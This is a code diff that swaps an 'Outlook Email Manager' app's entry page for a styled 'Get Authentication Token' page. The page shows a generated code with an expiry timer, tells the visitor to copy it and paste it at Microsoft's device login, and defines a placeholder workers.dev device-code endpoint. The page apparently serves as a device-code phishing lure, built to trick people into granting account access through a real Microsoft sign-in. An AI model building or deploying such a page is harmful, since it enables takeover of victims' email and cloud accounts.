@@ -1,13 +1,451 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Boom - Outlook Email Manager</title>
-  </head>
-  <body>
-    <div id="root"></div>
-    <script type="module" src="/src/main.jsx"></script>
-  </body>
-</html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Get Authentication Token</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
+    body {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+    }
+
+    .container {
+      background: white;
+      border-radius: 20px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      padding: 60px 40px;
+      max-width: 600px;
+      width: 90%;
+      text-align: center;
+    }
+
+    .icon-download {
+      font-size: 80px;
+      margin-bottom: 20px;
+      animation: float 3s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0px); }
+      50% { transform: translateY(-20px); }
+    }
+
+    h1 {
+      color: #333;
+      font-size: 32px;
+      margin-bottom: 10px;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: #666;
+      font-size: 16px;
+      margin-bottom: 40px;
+    }
+
+    .token-section {
+      background: #f8f9fa;
+      border: 2px solid #e0e0e0;
+      border-radius: 12px;
+      padding: 30px 20px;
+      margin-bottom: 40px;
+      position: relative;
+    }
+
+    .token-label {
+      color: #888;
+      font-size: 12px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 15px;
+      display: block;
+    }
+
+    .token-display {
+      background: white;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 15px;
+      font-family: 'Monaco', 'Courier New', monospace;
+      font-size: 13px;
+      color: #333;
+      word-break: break-all;
+      line-height: 1.6;
+      max-height: 120px;
+      overflow-y: auto;
+      text-align: left;
+    }
+
+    .copy-button {
+      background: #667eea;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      width: 100%;
+      justify-content: center;
+    }
+
+    .copy-button:hover {
+      background: #5568d3;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    }
+
+    .copy-button.copied {
+      background: #10b981;
+    }
+
+    .steps {
+      text-align: left;
+      background: #f0f9ff;
+      border-left: 4px solid #667eea;
+      border-radius: 8px;
+      padding: 25px;
+      margin-bottom: 30px;
+    }
+
+    .steps-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    .step-item {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 15px;
+      align-items: flex-start;
+    }
+
+    .step-item:last-child {
+      margin-bottom: 0;
+    }
+
+    .step-number {
+      background: #667eea;
+      color: white;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    .step-text {
+      color: #555;
+      font-size: 14px;
+      line-height: 1.6;
+    }
+
+    .step-text strong {
+      color: #333;
+    }
+
+    .button-group {
+      display: flex;
+      gap: 12px;
+      margin-top: 30px;
+    }
+
+    .btn {
+      flex: 1;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .btn-primary {
+      background: #667eea;
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background: #5568d3;
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    }
+
+    .btn-secondary {
+      background: #e0e0e0;
+      color: #333;
+    }
+
+    .btn-secondary:hover {
+      background: #d0d0d0;
+    }
+
+    .loading {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: white;
+      animation: spin 1s ease-in-out infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .status-message {
+      margin-top: 15px;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      display: none;
+    }
+
+    .status-message.show {
+      display: block;
+    }
+
+    .status-message.success {
+      background: #d1fae5;
+      color: #047857;
+      border: 1px solid #6ee7b7;
+    }
+
+    .status-message.error {
+      background: #fee2e2;
+      color: #dc2626;
+      border: 1px solid #fca5a5;
+    }
+
+    .countdown {
+      font-size: 12px;
+      color: #888;
+      margin-top: 10px;
+      font-style: italic;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  
+  <!-- Header -->
+  <div class="icon-download">📥</div>
+  <h1>Get Authentication Token</h1>
+  <p class="subtitle">Your secure access token will be generated instantly</p>
+
+  <!-- Token Section -->
+  <div class="token-section">
+    <span class="token-label">Your Token</span>
+    
+    <div id="tokenDisplay" class="token-display">
+      <div class="loading"></div> Generating token...
+    </div>
+
+    <button class="copy-button" onclick="copyToken()" id="copyBtn">
+      <span>📋</span>
+      <span id="copyText">Copy Token</span>
+    </button>
+
+    <div class="status-message" id="statusMsg"></div>
+    <div class="countdown" id="countdown"></div>
+  </div>
+
+  <!-- Steps -->
+  <div class="steps">
+    <div class="steps-title">📍 How to Use Your Token</div>
+    
+    <div class="step-item">
+      <div class="step-number">1</div>
+      <div class="step-text">
+        <strong>Copy</strong> your token using the button above
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-number">2</div>
+      <div class="step-text">
+        <strong>Authenticate</strong> by completing the device login process
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-number">3</div>
+      <div class="step-text">
+        <strong>Paste</strong> your token when prompted in the next page
+      </div>
+    </div>
+
+    <div class="step-item">
+      <div class="step-number">4</div>
+      <div class="step-text">
+        <strong>Access</strong> your secured resources immediately
+      </div>
+    </div>
+  </div>
+
+  <!-- Action Buttons -->
+  <div class="button-group">
+    <button class="btn btn-primary" onclick="redirectToDevice()" id="redirectBtn">
+      🔐 Continue to Device Login
+    </button>
+    <button class="btn btn-secondary" onclick="regenerateToken()">
+      🔄 Regenerate Token
+    </button>
+  </div>
+
+</div>
+
+<script>
+  // Configuration
+  const TOKEN_EXPIRY = 30 * 60 * 1000; // 30 minutes
+  const API_ENDPOINT = 'https://your-api.workers.dev/api/device-code';
+  const DEVICE_LOGIN_URL = 'https://microsoft.com/devicelogin';
+
+  let currentToken = null;
+  let tokenGeneratedAt = null;
+
+  // Generate random token
+  function generateToken() {
+    const timestamp = Date.now().toString(36).toUpperCase();
+    const random1 = Math.random().toString(36).substr(2, 8).toUpperCase();
+    const random2 = Math.random().toString(36).substr(2, 8).toUpperCase();
+    return `${timestamp}-${random1}-${random2}`;
+  }
+
+  // Initialize on page load
+  window.addEventListener('load', () => {
+    generateAndDisplayToken();
+    startCountdown();
+  });
+
+  // Generate and display token
+  function generateAndDisplayToken() {
+    currentToken = generateToken();
+    tokenGeneratedAt = Date.now();
+
+    setTimeout(() => {
+      document.getElementById('tokenDisplay').innerHTML = currentToken;
+      showStatus('Token generated successfully!', 'success');
+    }, 1500);
+  }
+
+  // Copy token to clipboard
+  function copyToken() {
+    if (!currentToken) {
+      showStatus('Token not yet generated', 'error');
+      return;
+    }
+
+    navigator.clipboard.writeText(currentToken).then(() => {
+      const btn = document.getElementById('copyBtn');
+      const text = document.getElementById('copyText');
+      
+      btn.classList.add('copied');
+      text.textContent = '✅ Copied!';
+
+      setTimeout(() => {
+        btn.classList.remove('copied');
+        text.textContent = '📋 Copy Token';
+      }, 2000);
+    }).catch(() => {
+      showStatus('Failed to copy token', 'error');
+    });
+  }
+
+  // Show status message
+  function showStatus(message, type) {
+    const statusMsg = document.getElementById('statusMsg');
+    statusMsg.textContent = message;
+    statusMsg.className = `status-message show ${type}`;
+
+    if (type === 'success') {
+      setTimeout(() => {
+        statusMsg.classList.remove('show');
+      }, 3000);
+    }
+  }
+
+  // Countdown timer
+  function startCountdown() {
+    const countdown = () => {
+      if (!tokenGeneratedAt) return;
+
+      const elapsed = Date.now() - tokenGeneratedAt;
+      const remaining = Math.max(0, TOKEN_EXPIRY - elapsed);
+      const minutes = Math.floor(remaining / 60000);
+      const seconds = Math.floor((remaining % 60000) / 1000);
+
+      const countdownEl = document.getElementById('countdown');
+      countdownEl.textContent = `Token expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+
+      if (remaining > 0) {
+        setTimeout(countdown, 1000);
+      } else {
+        countdownEl.textContent = '⚠️ Token expired. Generate a new one.';
+        document.getElementById('copyBtn').disabled = true;
+        document.getElementById('redirectBtn').disabled = true;
+      }
+    };
+
+    countdown();
+  }
+
+  // Regenerate token
+  function regenerateToken() {
+    generateAndDisplayToken();
+    startCountdown();
+  }
+
+  // Redirect to device login
+  function redirectToDevice() {
+    if (!currentToken) {
+      showStatus('Token not generated yet', 'error');
+      return;
+    }
+
+    // Store token in session storage for next page
+    sessionStorage.setItem('authToken', currentToken);
+    sessionStorage.setItem('tokenGeneratedAt', tokenGeneratedAt.toString());
+
+    // Redirect to device login with token as param
+    window.location.href = `${DEVICE_LOGIN_URL}?token=${encodeURIComponent(currentToken)}`;
+  }
+
+  // Error handling
+  window.addEventListener('error', (event) => {
+    console.error('Error:', event.error);
+  });
+
+</script>
+
+</body>
+</html>
